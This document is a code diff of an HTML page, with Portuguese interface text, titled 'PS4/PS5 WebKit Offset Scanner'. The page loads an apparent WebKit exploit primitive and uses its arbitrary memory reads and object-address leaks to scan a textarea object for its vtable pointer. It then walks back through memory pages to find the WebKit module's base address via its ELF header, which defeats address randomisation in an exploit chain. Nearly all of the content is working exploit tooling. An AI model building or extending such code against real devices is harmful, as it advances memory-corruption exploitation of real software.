@@ -4,33 +4,63 @@
 <meta charset="utf-8">
 <title>PS4/PS5 WebKit Offset Scanner</title>
 <style>
-  body { font-family: ui-monospace, monospace; background:#111; color:#ddd; margin:16px; }
-  h1,h2 { color:#8cf; }
-  button { margin:4px 8px 4px 0; padding:6px 12px; }
-  #log { white-space:pre-wrap; background:#1a1a1a; border:1px solid #333;
-         padding:12px; max-height:70vh; overflow:auto; font-size:13px; }
-  .ok   { color:#6f6; }
-  .fail { color:#f66; }
-  .info { color:#8cf; }
-  .warn { color:#fc6; }
+  body {
+    font-family: ui-monospace, "Cascadia Code", "Consolas", monospace;
+    background: #0d0d0d;
+    color: #d0d0d0;
+    margin: 16px;
+    line-height: 1.45;
+  }
+  h1 { color: #7ec8ff; margin-bottom: 4px; }
+  h2 { color: #9ad; font-size: 1.05em; margin-top: 1.4em; }
+  p  { color: #888; margin-top: 0; }
+  button {
+    margin: 4px 8px 4px 0;
+    padding: 8px 14px;
+    background: #1e2a3a;
+    color: #cde;
+    border: 1px solid #345;
+    border-radius: 4px;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  button:hover { background: #2a3a4e; }
+  button:disabled { opacity: 0.5; cursor: default; }
+  #log {
+    white-space: pre-wrap;
+    background: #141414;
+    border: 1px solid #2a2a2a;
+    border-radius: 6px;
+    padding: 14px;
+    max-height: 78vh;
+    overflow: auto;
+    font-size: 13px;
+    margin-top: 12px;
+  }
+  .ok   { color: #6dce6d; }
+  .fail { color: #f66; }
+  .info { color: #7ec8ff; }
+  .warn { color: #e0b84e; }
+  .dim  { color: #666; }
 </style>
 </head>
 <body>
-<h1>WebKit Offset Scanner (PS4 / PS5)</h1>
-<p>Roda depois do primitivo estar instalado em <code>window.p</code>.</p>
+<h1>WebKit Offset Scanner</h1>
+<p>PS4 / PS5 — roda depois do primitivo (core + mem). Módulos em <code>./resources/</code>.</p>
 
-<button id="btn-run">1. Rodar scanner completo</button>
+<button id="btn-run">Rodar scanner completo</button>
 <button id="btn-clear">Limpar log</button>
 
 <div id="log"></div>
 
 <script type="module">
-// Ajuste os caminhos se os seus arquivos tiverem nomes/versão diferentes
 import { establishPrimitive } from "./resources/core.js";
 import { installWindowP }     from "./resources/mem.js";
 import { int64 }              from "./resources/int64.js";
 
 const logEl = document.getElementById("log");
+const btnRun = document.getElementById("btn-run");
+
 function log(msg, cls = "") {
   const line = document.createElement("div");
   if (cls) line.className = cls;
@@ -39,15 +69,15 @@ function log(msg, cls = "") {
   logEl.scrollTop = logEl.scrollHeight;
 }
 function clearLog() { logEl.innerHTML = ""; }
-
 document.getElementById("btn-clear").onclick = clearLog;
 
-// ---------------------------------------------------------------------------
-// Utilitários de leitura (usam window.p depois de instalado)
-// ---------------------------------------------------------------------------
 function hex(n) {
   if (n instanceof int64) return "0x" + n.toString(16);
-  if (typeof n === "number") return "0x" + (n >>> 0).toString(16);
+  if (typeof n === "number") {
+    if (!Number.isFinite(n)) return String(n);
+    if (n < 0) return "-0x" + ((-n) >>> 0).toString(16);
+    return "0x" + (n >>> 0).toString(16);
+  }
   return String(n);
 }
 
@@ -55,8 +85,15 @@ function read8(addr)  { return window.p.read8(addr); }
 function read4(addr)  { return window.p.read4(addr); }
 function leakval(obj) { return window.p.leakval(obj); }
 
+function sub32(a, val) {
+  const lo = (a.low - (val >>> 0)) >>> 0;
+  let hi = a.hi;
+  if (lo > a.low) hi = (hi - 1) >>> 0;
+  return new int64(lo, hi);
+}
+
 // ---------------------------------------------------------------------------
-// 1) Provar que o primitivo está vivo
+// 1) Prova do primitivo + dump da célula
 // ---------------------------------------------------------------------------
 function provePrimitive() {
   log("--- Prova do primitivo ---", "info");
@@ -64,21 +101,29 @@ function provePrimitive() {
   const cell = leakval(ta);
   log("leakval(textarea) = " + hex(cell));
 
-  // Lê 0x40 bytes a partir da célula e mostra
   let dump = "";
   for (let i = 0; i < 0x40; i += 8) {
     const v = read8(cell.add32(i));
-    dump += `  +0x${i.toString(16).padStart(2,"0")}: ${hex(v)}\n`;
+    dump += `  +0x${i.toString(16).padStart(2, "0")}: ${hex(v)}\n`;
   }
   log(dump);
   return cell;
 }
 
+function dumpInterestingPointers(cell, size = 0x80) {
+  log("--- Ponteiros plausíveis na célula ---", "info");
+  for (let i = 0; i < size; i += 8) {
+    try {
+      const v = read8(cell.add32(i));
+      if (v.hi > 0 && v.hi <= 0xffff && (v.low & 7) === 0 && v.low !== 0) {
+        log(`  +0x${i.toString(16).padStart(2, "0")}: ${hex(v)}`);
+      }
+    } catch (_) {}
+  }
+}
+
 // ---------------------------------------------------------------------------
 // 2) Scanner do offset do ponteiro de vtable
-//    No PS5 costuma ser +0x18; no PS4 você já viu +0x10.
-//    Testamos vários candidatos e verificamos se o valor apontado
-//    parece uma vtable (ponteiro canônico + alinhado).
 // ---------------------------------------------------------------------------
 function scanVtablePtrOffset(cell) {
   log("--- Scanner de offset do vtable pointer ---", "info");
@@ -89,7 +134,6 @@ function scanVtablePtrOffset(cell) {
   for (const off of candidates) {
     try {
       const maybeVtPtr = read8(cell.add32(off));
-      // heurística: ponteiro de usuário, alinhado a 8, canônico (hi pequeno)
       const plausible =
         maybeVtPtr.hi <= 0xffff &&
         maybeVtPtr.low !== 0 &&
@@ -97,18 +141,19 @@ function scanVtablePtrOffset(cell) {
 
       let firstSlot = null;
       let looksLikeVtable = false;
+
       if (plausible) {
-        firstSlot = read8(maybeVtPtr);           // primeiro elemento da vtable
+        firstSlot = read8(maybeVtPtr);
         looksLikeVtable =
           firstSlot.hi <= 0xffff &&
           firstSlot.low !== 0 &&
-          (firstSlot.low & 0xf) === 0;           // código costuma ser 16-byte aligned
+          (firstSlot.low & 0xf) === 0;
       }
 
       const mark = looksLikeVtable ? "OK" : (plausible ? "?" : "no");
+      const cls  = looksLikeVtable ? "ok" : (plausible ? "warn" : "dim");
       log(`  offset +0x${off.toString(16)} → vtPtr=${hex(maybeVtPtr)}  ` +
-          `first=${firstSlot ? hex(firstSlot) : "n/a"}  [${mark}]`,
-          looksLikeVtable ? "ok" : (plausible ? "warn" : ""));
+          `first=${firstSlot ? hex(firstSlot) : "n/a"}  [${mark}]`, cls);
       results.push({ off, vtPtr: maybeVtPtr, firstSlot, looksLikeVtable });
     } catch (e) {
       log(`  offset +0x${off.toString(16)} → erro: ${e.message}`, "fail");
@@ -118,46 +163,95 @@ function scanVtablePtrOffset(cell) {
 }
 
 // ---------------------------------------------------------------------------
-// 3) A partir de um vtPtr escolhido, tentar achar a base do WebKit
-//    Estratégia simples: ler o primeiro slot da vtable e subtrair
-//    vários RVAs candidatos (você preenche a lista com valores
-//    conhecidos de firmwares próximas).
+// 3) Resolução completa da vtable + page-walk para achar webkitBase
 // ---------------------------------------------------------------------------
-function tryFindWebKitBase(vtPtr, rvaCandidates) {
-  log("--- Tentativa de base do WebKit ---", "info");
-  const first = read8(vtPtr);
-  log("vtable[0] = " + hex(first));
+function tryFindWebKitBaseFromVtable(cell, vtablePtrOffset) {
+  log("--- Resolução completa da vtable ---", "info");
+  log(`Usando VTABLE_PTR_OFFSET = +0x${vtablePtrOffset.toString(16)}`, "info");
 
-  for (const rva of rvaCandidates) {
-    // first - rva
-    const lo = (first.low - (rva >>> 0)) >>> 0;
-    let hi = first.hi;
-    if (lo > first.low) hi = (hi - 1) >>> 0;   // borrow
-    const base = new int64(lo, hi);
-
-    // heurística de módulo userland: página alinhada e faixa razoável
-    const pageAligned = (base.low & 0x3fff) === 0;
-    const inRange = base.hi >= 0x1 && base.hi <= 0x7;   // ajuste se necessário
-
-    log(`  RVA 0x${rva.toString(16)} → base ${hex(base)}  ` +
-        `aligned=${pageAligned} range=${inRange}`,
-        (pageAligned && inRange) ? "ok" : "warn");
+  let cppObj, vtable, firstFn;
+  try {
+    cppObj  = read8(cell.add32(vtablePtrOffset));
+    vtable  = read8(cppObj);
+    firstFn = read8(vtable);
+  } catch (e) {
+    log("Falha ao seguir a cadeia vtable: " + e.message, "fail");
+    return;
   }
-}
 
-// ---------------------------------------------------------------------------
-// 4) Scanner genérico de ponteiros “interessantes” dentro da célula
-// ---------------------------------------------------------------------------
-function dumpInterestingPointers(cell, size = 0x80) {
-  log("--- Ponteiros plausíveis na célula ---", "info");
-  for (let i = 0; i < size; i += 8) {
+  log("cppObj     = " + hex(cppObj));
+  log("vtable     = " + hex(vtable));
+  log("vtable[0]  = " + hex(firstFn));
+
+  // Alguns firmwares guardam a vtable direto no slot (sem objeto C++ no meio).
+  // Se firstFn não parecer código, tenta o caminho alternativo.
+  const firstLooksCode =
+    firstFn.hi > 0 && firstFn.hi <= 0xffff &&
+    firstFn.low !== 0 && (firstFn.low & 0xf) === 0;
+
+  if (!firstLooksCode) {
+    log("vtable[0] não parece ponteiro de código — tentando caminho alternativo", "warn");
     try {
-      const v = read8(cell.add32(i));
-      if (v.hi > 0 && v.hi <= 0xffff && (v.low & 7) === 0 && v.low !== 0) {
-        log(`  +0x${i.toString(16).padStart(2,"0")}: ${hex(v)}`);
+      // Trata o valor em cell+off como a própria vtable
+      const altVtable = cppObj;
+      const altFirst  = vtable;   // já lemos *cppObj
+      log("alt vtable  = " + hex(altVtable));
+      log("alt first   = " + hex(altFirst));
+      if (altFirst.hi > 0 && (altFirst.low & 0xf) === 0) {
+        cppObj  = null;
+        vtable  = altVtable;
+        firstFn = altFirst;
       }
     } catch (_) {}
   }
+
+  log("--- Candidatos a webkitBase (page walk a partir de vtable[0]) ---", "info");
+
+  const pageSize = 0x4000;
+  const maxPages = 0x1000;          // ~64 MB para trás
+  const found = [];
+  const shown = [];
+
+  for (let i = 0; i < maxPages; i++) {
+    const off = i * pageSize;
+    const base = sub32(firstFn, off);
+
+    if ((base.low & 0x3fff) !== 0) continue;
+    if (base.hi < 1 || base.hi > 0x20) continue;
+
+    let magic = 0;
+    try { magic = read4(base); } catch (_) { continue; }
+
+    const isElf  = magic === 0x464c457f;
+    const isZero = magic === 0;
+    const interesting = isElf;
+
+    if (interesting || i < 12) {
+      const tag = isElf ? " ELF" : (isZero ? " zero" : "");
+      log(`  -0x${off.toString(16).padStart(5, "0")} → base ${hex(base)}  ` +
+          `magic=0x${(magic >>> 0).toString(16)}${tag}`,
+          interesting ? "ok" : "dim");
+      shown.push(base);
+      if (interesting) found.push({ base, rva: off });
+    }
+  }
+
+  if (found.length === 0) {
+    log("Nenhuma base com magic ELF. Use os primeiros candidatos alinhados " +
+        "e calcule RVA = vtable[0] - base manualmente.", "warn");
+  } else {
+    log("Possíveis bases ELF:", "ok");
+    for (const f of found) {
+      log(`  base=${hex(f.base)}  RVA(vtable[0])=0x${f.rva.toString(16)}`, "ok");
+    }
+  }
+
+  // Também mostra o RVA se o usuário já tiver uma base candidata em mente
+  log("--- Dica ---", "info");
+  log("Se você já suspeita de uma base, calcule:");
+  log("  OFFSET_wk_vtable_first_element = vtable[0] - webkitBase");
+  log("Depois no main.js:");
+  log("  libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element)");
 }
 
 // ---------------------------------------------------------------------------
@@ -165,53 +259,53 @@ function dumpInterestingPointers(cell, size = 0x80) {
 // ---------------------------------------------------------------------------
 async function runScanner() {
   clearLog();
+  btnRun.disabled = true;
   log("Iniciando…", "info");
 
   try {
-    // 1. Estabelece o primitivo (mesmo caminho do exploit original)
     log("Chamando establishPrimitive()…");
     const carrier = await establishPrimitive({
-      onEvent: (tag, detail) => log(`[core] ${tag} ${detail}`),
-      maxAttempts: 30
+      onEvent: (tag, detail) => log(`[core] ${tag} ${detail}`, "dim"),
+      maxAttempts: 40
     });
     log("Primitive OK", "ok");
 
-    // 2. Instala window.p (sem promoção se quiser só o fake-cell)
     installWindowP(carrier, {
-      promote: true,          // mude para false se a promoção estiver instável
-      onEvent: (tag, detail) => log(`[mem] ${tag} ${detail}`)
+      promote: true,
+      onEvent: (tag, detail) => log(`[mem] ${tag} ${detail}`, "dim")
     });
     log("window.p instalado", "ok");
 
-    // 3. Provas e scans
     const cell = provePrimitive();
     dumpInterestingPointers(cell);
+
     const vtResults = scanVtablePtrOffset(cell);
 
-    // Escolhe o melhor candidato automaticamente (primeiro que passou na heurística)
-    const best = vtResults.find(r => r.looksLikeVtable);
+    // Prefere o primeiro que passou na heurística forte; senão o de +0x18
+    let best = vtResults.find(r => r.looksLikeVtable);
+    if (!best) {
+      best = vtResults.find(r => r.off === 0x18) ||
+             vtResults.find(r => r.off === 0x10) ||
+             vtResults.find(r => r.vtPtr && r.vtPtr.low !== 0);
+    }
+
     if (best) {
       log(`Melhor candidato de vtable offset: +0x${best.off.toString(16)}`, "ok");
-
-      // Lista de RVAs de exemplo – SUBSTITUA pelos valores reais das firmwares
-      // que você já conhece (ou de dumps públicos próximos da 13.42 / 9.xx etc.)
-      const rvaCandidates = [
-        0x0,          // só para ver o valor cru
-        // 0x123456,  // exemplo – coloque RVAs conhecidos aqui
-      ];
-      tryFindWebKitBase(best.vtPtr, rvaCandidates);
+      tryFindWebKitBaseFromVtable(cell, best.off);
     } else {
-      log("Nenhum offset de vtable passou na heurística automática. " +
-          "Olhe o dump e teste manualmente.", "warn");
+      log("Nenhum offset de vtable útil. Olhe o dump da célula.", "warn");
     }
 
     log("Scanner terminou.", "info");
   } catch (e) {
-    log("ERRO: " + e + "\n" + (e.stack || ""), "fail");
+    log("ERRO: " + e, "fail");
+    if (e && e.stack) log(String(e.stack), "fail");
+  } finally {
+    btnRun.disabled = false;
   }
 }
 
-document.getElementById("btn-run").onclick = runScanner;
+btnRun.onclick = runScanner;
 </script>
 </body>
 </html>
